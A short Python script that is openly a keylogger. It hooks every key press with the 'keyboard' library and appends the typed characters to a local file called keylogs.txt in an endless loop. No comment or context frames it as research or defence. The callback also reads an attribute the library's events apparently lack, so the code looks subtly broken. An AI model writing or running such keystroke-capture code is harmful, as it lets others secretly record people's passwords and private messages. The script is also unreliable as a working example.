import keyboard
import time
import os

try:
    file = open("keylogs.txt", "a")
except Exception as e:
    print(e)

def on_press(key):
    try:
        file.write(str(key.char))
    except Exception as e:
        print(e)

keyboard.on_press(on_press)

while True:
    time.sleep(0.1)